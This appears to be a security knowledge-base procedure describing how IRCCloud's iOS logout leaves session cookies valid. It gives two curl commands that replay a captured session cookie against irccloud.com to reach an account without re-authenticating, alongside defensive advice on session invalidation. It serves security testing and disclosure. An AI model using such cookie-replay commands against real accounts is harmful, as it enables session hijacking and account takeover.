---
tags:
  - session-hijacking
  - improper-authentication
  - mobile-security
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-apn-unregister]]'
verified: false
platforms:
  - iOS
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:24:39.724Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques:
  - '[[Default Accounts]]'
id: b2921705-8c9f-4b6b-9169-f07c5c8092c1
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Demonstrate IRCCloud Logout Session Failure

## Summary

This procedure demonstrates the IRCCloud iOS application's failure to invalidate user sessions upon logout, allowing captured session cookies to be reused for unauthorized access to the victim's account.

## Description

The IRCCloud iOS app sends a POST request to the /apn-unregister endpoint during logout, but the server does not destroy the associated session identifier. This leaves the session cookie valid, enabling attackers to hijack sessions if the cookie is leaked (e.g., via network interception or device compromise). The procedure involves simulating the logout and verifying session persistence, applicable in mobile security testing for apps with web backends like Cowboy server.

## Requirements

1. IRCCloud iOS app installed on a test device
2. Valid IRCCloud account credentials
3. Network access to irccloud.com (no specific ports beyond standard HTTPS 443)
4. Optional: Proxy tool like Burp Suite for traffic inspection

## Defense

Defensive measures and detection strategies:

- Implement proper session invalidation on logout by destroying server-side session data
- Use short-lived session cookies with secure flags (HttpOnly, Secure)
- Monitor for anomalous session reuse via logging access patterns
- Enforce device binding for sessions to prevent cookie reuse on other devices

## Objectives

1. Verify that logout does not invalidate the session
2. Demonstrate potential for account takeover via cookie reuse
3. Highlight the need for robust session management in mobile apps

## Instructions

### Step 1: Initiate Logout in iOS App

**Context**: Perform the logout action to trigger the vulnerable request and observe the response.

**Command** ([[commands/curl-apn-unregister]]):
```bash
curl -X POST https://irccloud.com/apn-unregister \
  -H "Cookie: session=1.eaf395c450d6ad52023804d9846b7376" \
  -d "device_id=your_device_id&session=1.eaf395c450d6ad52023804d9846b7376"
```

> This simulates the app's logout request. The server returns HTTP 200 with {"_reqid":0,"success":true}, but the session remains active. In the actual app, perform logout via the UI and inspect storage.

### Step 2: Test Session Reuse

**Context**: Attempt to reuse the session cookie in a new request to confirm persistence.

**Command** ([[commands/curl-apn-unregister]] adapted for access):
```bash
curl -H "Cookie: session=1.eaf395c450d6ad52023804d9846b7376" https://irccloud.com/chat
```

> If successful, the response grants access to account data without re-authentication, confirming the vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques

- [[Default Accounts]] Default Accounts (adapted for session reuse)

## Commands Used

- [[commands/curl-apn-unregister]]

## Tools Used

None

## Tags

- session-hijacking
- improper-logout
- authentication-bypass
